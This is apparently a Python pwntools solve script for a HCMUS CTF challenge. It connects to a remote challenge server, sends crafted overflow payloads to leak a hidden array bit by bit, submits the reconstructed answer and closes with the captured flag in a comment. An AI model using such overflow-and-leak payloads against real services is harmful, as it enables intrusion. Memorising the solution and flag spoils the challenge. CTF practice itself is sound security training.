from pwn import *
from struct import pack, unpack

gdbscript = """
break *question+136
c
"""
# gdbscript = """"""

elf_file = context.binary = ELF('./chall', checksec=False)
rop = ROP(elf_file)

# p = gdb.debug('./chall', gdbscript=gdbscript)
# p = process("./chall")
p = remote("chall.blackpinker.com",  33059)
context.log_level = "debug"

def build_bitmask_queries(n=100):
    queries = []
    for b in range(6):
        q = []
        for i in range(n):
            q.append(str((i >> b) & 1))
        queries.append(''.join(q))
    return queries

def ask(payload):
    p.sendline(b'?')
    p.sendline(payload)
    return p.recv(0x65)

p.recvline()

bitmask_queries = build_bitmask_queries()
responses = []
for query_idx in range(6):
    bitmask = bitmask_queries[query_idx].encode()
    payload = bitmask + b'\x00'*28
    for i in range(14):
        val = 128 + 14*4*(query_idx+1) + 4* i + 1
        if val == 0xa:
            val = 100
        payload += int.to_bytes(val, 4, 'little')
    payload = payload[:-1]
    res = ask(payload)
    responses.append(res)
    
print(responses)
    
bit_leaks = [[0]*100 for _ in range(6)]  # 6 x 100 bits

for b in range(6):
    resp = responses[b].strip()
    for i in range(14, len(resp)):
        bit_leaks[b][i] = int(chr(resp[i]))  # store bit b of arr[i]-1
        
arr = [0]*100
remaining_nums = list(range(1, 101))
arr[:14] = list(range(128 + 14*4*6 + 1, 128+14*4*6+14*4 + 1, 4))
for i in range(6):
    for j in range(14):
        arr[14*(i+1)+j] = responses[i][j]
        print(responses[i][j])
        remaining_nums.remove(responses[i][j])
        

# Use bit leaks to resolve remaining entries
for idx in range(98, 100):
    if arr[idx] != 0:
        continue  # already known
    
    leak = [bit_leaks[b][idx] for b in range(6)]
    
    for candidate in remaining_nums:
        bits = [(candidate - 1) >> b & 1 for b in range(6)]
        if bits == leak:
            arr[idx] = candidate
            break


print(arr)
# print(remaining_nums)

final_answer = " ".join([str(i) for i in arr])

p.sendline(b"!")
p.sendline(final_answer)
p.interactive()

# HCMUS-CTF{A_b!t_of_OVerFL0W_4ND_brU7e_fORcin9_mAY_Be_neC3SsArY}
